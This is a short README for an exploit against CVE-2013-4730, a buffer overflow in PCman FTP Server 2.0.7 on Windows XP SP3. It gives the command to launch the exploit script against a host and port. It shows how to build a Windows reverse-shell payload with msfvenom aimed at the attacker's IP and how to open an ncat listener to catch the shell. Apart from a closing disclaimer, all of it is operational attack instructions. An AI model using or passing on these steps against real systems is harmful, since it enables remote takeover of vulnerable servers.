# PCman FTP Server Buffer overflow and Remote Code Execution [CVE-2013-4730]
A very simple buffer overflow using CVE-2013-4730 against PCman's FTP server v.2.0.7
## How it works?
That easy BoF overwrite the buffer and execute the shellcode that will connect back (reverse shell)
## Vuln machines:
WindowsXP SP3 running PCman's FTP Server at version 2.0.7
## launch
````~$ python3 PCman.py <host> <port>````
## Repleace the shellcode with your own!!
````~$ sudo ./msfvenom windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444````
## Launch netcat 
````~$ ncat -lvp <shellcode port>````
## Use only on your own machine!!
